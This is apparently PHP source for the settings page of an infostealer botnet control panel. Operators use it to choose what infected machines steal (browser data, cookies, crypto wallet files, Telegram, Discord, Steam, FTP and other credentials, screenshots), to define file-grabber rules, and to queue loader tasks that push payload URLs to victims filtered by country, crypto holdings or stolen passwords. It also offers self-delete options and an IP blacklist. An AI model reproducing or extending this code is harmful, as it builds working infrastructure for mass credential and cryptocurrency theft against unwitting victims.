<?php
require_once('common.php'); 
require_once('global.php');
?>

<!DOCTYPE html>
<html>
	<head>
        <link rel="shortcut icon" type="image/png" href="img/favicon.png">
        <script src="js/functions.js"></script>
	</head>

	<body>
        <?php
            function write_ini_file($file, $array = [])
            {
                $data = array();
                foreach ($array as $key => $val) {
                    if (is_array($val)) {
                        $data[] = "[$key]";
                        foreach ($val as $skey => $sval) {
                            if (is_array($sval)) {
                                foreach ($sval as $_skey => $_sval) {
                                    if (is_numeric($_skey)) {
                                        $data[] = $skey.'[] = '.(is_numeric($_sval) ? $_sval : (ctype_upper($_sval) ? $_sval : '"'.$_sval.'"'));
                                    } else {
                                        $data[] = $skey.'['.$_skey.'] = '.(is_numeric($_sval) ? $_sval : (ctype_upper($_sval) ? $_sval : '"'.$_sval.'"'));
                                    }
                                }
                            } else {
                                $data[] = $skey.' = '.(is_numeric($sval) ? $sval : (ctype_upper($sval) ? $sval : '"'.$sval.'"'));
                            }
                        }
                    } else {
                        $data[] = $key.' = '.(is_numeric($val) ? $val : (ctype_upper($val) ? $val : '"'.$val.'"'));
                    }
                    $data[] = null;
                }

                // open file pointer, init flock options
                $fp = fopen($file, 'w');
                if (!$fp) return false;
                $retries = 0;
                $max_retries = 100;

                // loop until get lock, or reach max retries
                do {
                    if ($retries) sleep(rand(1, 5000));
                    $retries += 1;
                } while (!flock($fp, LOCK_EX) && $retries <= $max_retries);

                // couldn't get the lock
                if ($retries == $max_retries) return false;

                // got lock, write data
                fwrite($fp, implode(PHP_EOL, $data).PHP_EOL);

                // release lock
                flock($fp, LOCK_UN);
                fclose($fp);
                return true;
            }

            function fixConfig(&$arr)
            {
                foreach ($arr as $key => $value)
                {
                    if ($value == on) $arr[$key] = 1;
                    //else if ($value == '') $arr[$key] = 0;
                    else $arr[$key] = $value;
                }
            }

            $botinfo = array(
                array('Chromium-Based', 'chromium'), array('Mozilla-Based', 'mozilla'), array('Wininet Cookies', 'wininetCookies'),
                array('Cryptocurrency Client Files', 'crypto'), array('Skype History', 'skype'), array('Telegram', 'telegram'),
                array('Discord', 'discord'), array('Battle.Net', 'battlenet'), array('Internet Explorer', 'iexplore'),
                array('Steam Files', 'steam'), array('Screenshot', 'screenshot'), array('FTP', 'ftp'), array('Credentials Data', 'credentials'),
                array('Jabber', 'jabber'), array('Self-Delete EXE', 'exeDelete'), array('Self-Delete DLL', 'dllDelete')
                );

            $conn = mysqli_connect(DB_HOST, DB_USER, DB_PASS, DB_NAME) or die();

            if (isset($_POST['action']))
			{
				if ($_POST['action'] === 'changeCFG')
				{
					$arr = array();
					for ($i = 0; $i < count($botinfo); ++$i)
					{
						$paramName = $botinfo[$i][1];
						$arr['bot'][$paramName] = $_POST[$paramName];
                    }
                    $arr['bot']['open_link'] = $_POST['open_link'];

					$arr['panel']['no_dubles'] = $_POST['panel_no_dubles'];

					fixConfig($arr['bot']);
					fixConfig($arr['panel']);

					write_ini_file("config.ini", $arr);
					header('Location: '.$_SERVER['REQUEST_URI']);
					die();
				}
				else if ($_POST['action'] == 'addFGRule' && isset($_POST['name']) && isset($_POST['mask']) && isset($_POST['exclude_mask']) &&
					isset($_POST['start_path']) && isset($_POST['exclude_dirs']) && isset($_POST['min_size']) && isset($_POST['max_size']) &&
					!empty($_POST['name']) && !empty($_POST['mask']) && !empty($_POST['start_path']))
				{
					$all_users = isset($_POST['all_users']) ? $_POST['all_users'] === 'on' : 0;
					$query = sprintf("INSERT IGNORE INTO `filegrabber` (name, mask, exclude_mask, path, exclude_dirs, min_size, max_size, all_users) VALUES ('%s', '%s', '%s', '%s', '%s', %d, %d, %d)",
						mysqli_real_escape_string($conn, $_POST['name']), mysqli_real_escape_string($conn, $_POST['mask']),
						mysqli_real_escape_string($conn, $_POST['exclude_mask']), mysqli_real_escape_string($conn, $_POST['start_path']),
						mysqli_real_escape_string($conn, $_POST['exclude_dirs']), mysqli_real_escape_string($conn, $_POST['min_size']),
						mysqli_real_escape_string($conn, $_POST['max_size']), $all_users);
					mysqlExecute($query);
					header('Location: '.$_SERVER['REQUEST_URI']);
					die();
				}
				else if ($_POST['action'] == 'deleteFGRule' && isset($_POST['delete_name']) && !empty($_POST['delete_name']))
				{
					$query = sprintf("DELETE FROM `filegrabber` WHERE name='%s'", mysqli_real_escape_string($conn, $_POST['delete_name']));
					mysqlExecute($query);
					exit();
				}
				else if ($_POST['action'] == 'addLDRRule' && isset($_POST['loader_url']) && isset($_POST['task_name']) &&
					isset($_POST['countries']) && isset($_POST['filter_links']) &&
					!empty($_POST['loader_url']) && !empty($_POST['task_name']))
				{
					$has_crypto = isset($_POST['has_crypto']) ? $_POST['has_crypto'] === 'on' : 0;
					$has_pwd = isset($_POST['links_pwd']) ? $_POST['links_pwd'] === 'on' : 0;
					$has_history = isset($_POST['links_history']) ? $_POST['links_history'] === 'on' : 0;
					$has_cookie = isset($_POST['links_cookie']) ? $_POST['links_cookie'] === 'on' : 0;
					$query = sprintf("INSERT IGNORE INTO `loader` (name, link, filter_links, countries, has_crypto, has_pwd, has_cookie, has_history) VALUES ('%s', '%s', '%s', '%s', %d, %d, %d, %d)",
						mysqli_real_escape_string($conn, $_POST['task_name']), mysqli_real_escape_string($conn, $_POST['loader_url']),
						mysqli_real_escape_string($conn, $_POST['filter_links']), mysqli_real_escape_string($conn, $_POST['countries']),
						$has_crypto, $has_pwd, $has_cookie, $has_history);
					mysqlExecute($query);
					header('Location: '.$_SERVER['REQUEST_URI']);
					die();
				}
				else if ($_POST['action'] == 'deleteLDRRule' && isset($_POST['delete_name']) && !empty($_POST['delete_name']))
				{
					$query = sprintf("DELETE FROM `loader` WHERE name='%s'", mysqli_real_escape_string($conn, $_POST['delete_name']));
					mysqlExecute($query);
				}
				else if ($_POST['action'] == 'setIL' && isset($_POST['links'])) {
					file_put_contents('config/links.txt', $_POST['links']);
					header('Location: '.$_SERVER['REQUEST_URI']);
					die();
				}
				else if ($_POST['action'] == 'setIPBlack' && isset($_POST['ips']))
				{
					file_put_contents('config/blackip.txt', $_POST['ips']);
					header('Location: '.$_SERVER['REQUEST_URI']);
					die();
				}
			}

            $type = "settings";
            include("nav_bar.php");
        ?>

        <div class="main-info">
            <div class="scrollmenu">
                <a href="?menu=config">Config</a>
                <a href="?menu=filegrabber">File grabber</a>
                <a href="?menu=loader">Loader</a>
                <a href="?menu=implinks">Important links</a>
                <a href="?menu=ipblack">IP Black List</a>
            </div>
            <?php if ($_GET['menu'] == 'config') { ?>
            <form id="config_action" method="post" style="padding-left: 65px;">
                <p class="content-subheading select-block" style="font-size:25px;font-weight:bold;margin-left: 0; margin-top: 25px; margin-bottom: 25px;">BOT Settings</p>
                <table>
                    <tbody>
                        <?php
                    $info = parse_ini_file("config.ini", TRUE);


                    foreach($info['bot'] as $key => $value)
                    {
                        if ($value == 1) $info['bot'][$key] = 'checked';
                        //else $info['bot'][$key] = '';
                    }

                    foreach($info['panel'] as $key => $value)
                    {
                        if ($value == 1) $info['panel'][$key] = 'checked';
                        //else $info['panel'][$key] = '';
                    }

                    for ($i = 0; $i < count($botinfo); ++$i)
                    {
                        $extName = $botinfo[$i][0];
                        $inName = $botinfo[$i][1];
                        echo "<tr><td style='font-size: 16px; border-bottom: solid 1px #084734;'>$extName</td><td><input type='checkbox' {$info['bot'][$inName]} class='context-checkbox' name='$inName' /></td></tr>";
                    }
                    echo sprintf(
            "<tr><td style='font-size:16px;border-bottom:solid 1px #084734;'>Link to open</td><td><input class='edit' value='%s' name='open_link'></td></tr>",
                        $info['bot']['open_link']);
                        ?>
                    </tbody>
                </table>
                <p class="content-subheading" style="font-size:25px;font-weight:bold;margin-left: 0; margin-top: 30px; margin-bottom: 15px;">Panel Settings</p>
                <table>
                    <tr>
                        <td style="font-size: 16px;">Delete dubles</td>
                        <td>
                            <input type="checkbox" <?php echo $info['panel']['no_dubles']; ?> class="content-checkbox" name="panel_no_dubles" />
                        </td>
                    </tr>
                </table>
                <input type="hidden" name="action" value="changeCFG" />

                    <button class="example_a" type="submit" style="margin-top:30px;width:250px;margin-left: 0;">
                        <i class="fas fa-sliders-h" style="margin-right: 5px;"></i> Set configuration
                </center>
            </form>
            <?php } else if ($_GET['menu'] == 'filegrabber') { ?>
            <form method="post" style="padding:5px;margin-left: 60px; margin-top: 20px; margin-bottom: 15px;">
                <table>
                    <tbody>
                        <tr>
                            <td class="content-subheading">Rule name:</td>
                            <td>
                                <input class="edit" name="name" />
                            </td>
                        </tr>
                        <tr>
                            <td class="content-subheading">Mask:</td>
                            <td>
                                <input class="edit" name="mask" />
                            </td>
                        </tr>
						<tr>
							<td class="content-subheading">Exclude mask:</td>
							<td>
								<input class="edit" name="exclude_mask" />
							</td>
						</tr>
                        <tr>
                            <td class="content-subheading">Start path:</td>
                            <td>
                                <input class="edit" name="start_path" />
                            </td>
                        </tr>
						<tr>
							<td class="content-subheading">Exclude directories:</td>
							<td>
								<input class="edit" name="exclude_dirs" />
							</td>
						</tr>
						<tr>
							<td class="content-subheading">All users: </td>
							<td>
								<input type="checkbox" class="content-checkbox" name="all_users" />
							</td>
						</tr>
                        <tr>
                            <td class="content-subheading">Min size:</td>
                            <td>
                                <input class="edit" type="number" name="min_size" value="0" />
                            </td>
                        </tr>
                        <tr>
                            <td class="content-subheading">Max size:</td>
                            <td>
                                <input class="edit" type="number" name="max_size" value="0" />
                            </td>
                        </tr>
                    </tbody>
                </table>
                <input type="hidden" name="action" value="addFGRule" />
                    <button class="example_a" type="submit" style="margin-left: 0;margin-top: 30px;"><i class="fas fa-plus-square" style="margin-right: 5px;"></i> Add rule</button>
            </form>

            <br />

            <table class="darkTable" style="margin-left: 65px; width: 95%;">
                <thead>
                    <tr>
                        <th scope="col">Rule name</th>
                        <th scope="col">Mask</th>
						<th scope="col">Exclude mask</th>
                        <th scope="col">Start path</th>
						<th scope="col">Exclude dirs</th>
						<th scope="col">All users</th>
                        <th scope="col">Min size</th>
                        <th scope="col">Max size</th>
                        <th scope="col"></th>
                    </tr>
                </thead>

                <tbody id="main_items">
                    <?php
                        $tasks = mysqlQuery('SELECT * FROM `filegrabber`');
                        for ($i = 0; $i < count($tasks); ++$i) {
                            echo "<tr>";
                            echo "<td>{$tasks[$i]['name']}</td>";
                            echo "<td>{$tasks[$i]['mask']}</td>";
							echo "<td>{$tasks[$i]['exclude_mask']}</td>";
                            echo "<td>{$tasks[$i]['path']}</td>";
							echo "<td>{$tasks[$i]['exclude_dirs']}</td>";
							echo "<td>{$tasks[$i]['all_users']}</td>";
                            echo "<td>{$tasks[$i]['min_size']}</td>";
                            echo "<td>{$tasks[$i]['max_size']}</td>";
                            echo sprintf("<td><button class='link-button' onclick='%s'><i class='fas fa-trash' style='color: #fff; font-size: 18px;'></i></button></td>",
                            '{delRow(this); makePost('.'"action=deleteFGRule&delete_name='.$tasks[$i]['name'].'");}');
                            echo "</tr>";
                        }
                    ?>
                </tbody>
            </table>
            <?php } else if ($_GET['menu'] == 'loader') { ?>
            <form method="post">
                <table style="margin-left: 65px; margin-top: 20px;">
                    <tbody>
                        <tr>
                            <td class="content-subheading">Task name: </td>
                            <td>
                                <input class="edit" name="task_name" />
                            </td>
                        </tr>
                        <tr>
                            <td class="content-subheading">File URL: </td>
                            <td>
                                <input class="edit" name="loader_url" />
                            </td>
                        </tr>
						<tr>
							<td class="content-subheading">Filter Links: </td>
							<td>
								<input class="edit" name="filter_links" />
								<label><input type="checkbox" class="content-checkbox" name="links_pwd" />Passwords</label>
								<label><input type="checkbox" class="content-checkbox" name="links_history" />History</label>
								<label><input type="checkbox" class="content-checkbox" name="links_cookie">Cookies</label>
							</td>
						</tr>
						<tr>
							<td class="content-subheading">Countries: </td>
							<td>
								<input class="edit" name="countries" />
							</td>
						</tr>
						<tr>
							<td class="content-subheading">Exclude countries: </td>
							<td>
								<input class="edit" name="exclude_countries" />
							</td>
						</tr>
						<tr>
							<td class="content-subheading">With crypto: </td>
							<td>
								<input type="checkbox" class="content-checkbox" name="has_crypto" />
							</td>
						</tr>
                    </tbody>
                </table>
                <input type="hidden" name="action" value="addLDRRule" />
                    <button class="example_a" type="submit" style="margin-top: 30px; margin-bottom: 30px;"><i class="fas fa-plus-square" style="margin-right: 5px;"></i>  Add task</button>
            </form>
            <br />
            <table class="darkTable" style="margin-left: 65px; width: 95%;">
                <thead>
                    <tr>
                        <th scope="col">Task name</th>
                        <th scope="col">File URL</th>
						<th scope="col">Filter Links</th>
						<th scope="col">Filter PWD|Cookies|History</th>
						<th scope="col">Countries</th>
						<th scope="col">Exclude countries</th>
						<th scope="col">With Crypto</th>
                        <th scope="col"></th>
                    </tr>
                </thead>

                <tbody id="main_items">
                    <?php
                        $tasks = mysqlQuery('SELECT * FROM `loader`');
                        for ($i = 0; $i < count($tasks); ++$i) {
                            echo "<tr>";
                            echo "<td>{$tasks[$i]['name']}</td>";
                            echo "<td>{$tasks[$i]['link']}</td>";
							echo "<td>{$tasks[$i]['filter_links']}</td>";
							echo sprintf("<td>%d|%d|%d</td>", $tasks[$i]['has_pwd'], $tasks[$i]['has_cookie'], $tasks[$i]['has_history']);
							echo "<td>{$tasks[$i]['countries']}</td>";
							echo "<td>{$tasks[$i]['exclude_countries']}</td>";
							echo "<td>{$tasks[$i]['has_crypto']}</td>";
                            echo sprintf("<td><button class='link-button' onclick='%s'><i class='fas fa-trash' style='color: #fff; font-size: 18px;'></i></button></td>",
                                '{delRow(this); makePost('.'"action=deleteLDRRule&delete_name='.$tasks[$i]['name'].'");}');
                            echo "</tr>";
                        }
                    ?>
                </tbody>
            </table>
            <?php
                }
                else if ($_GET['menu'] == 'implinks') {
            ?>
            <form method="post">
                <p class="content-subheading" style="padding-bottom: 10px; margin-left: 65px;">Links:</p>
                <textarea rows="30" class="ta-l" style="width: 94%; margin-left: 10px; margin-left: 15px; padding: 5px;" name="links"><?php
                    $links = file_get_contents('config/links.txt');
                    echo htmlspecialchars($links, ENT_QUOTES, 'UTF-8');
                ?></textarea>
                <input type="hidden" name="action" value="setIL" />
                    <button class="example_a" type="submit"><i class="fas fa-save" style="margin-right: 5px;"></i> Save</button>
            </form>
            <?php
                }
                else if ($_GET['menu'] == 'ipblack') {
            ?>
            <form method="post">
                <p class="content-subheading" style="padding-bottom: 10px; margin-left: 65px;">IP Black List:</p>
                <textarea rows="30" class="ta-l" style="width: 94%; padding: 5px; margin-left: 15px;" name="ips"><?php
                    $links = file_get_contents('config/blackip.txt');
                    echo htmlspecialchars($links, ENT_QUOTES, 'UTF-8');
                    ?></textarea>
                <input type="hidden" name="action" value="setIPBlack" />
                    <button class="example_a" type="submit"><i class="fas fa-save" style="margin-right: 5px;"></i>  Save</button>
            </form>
            <?php
                }
            ?>
        </div>
	</body>
</html>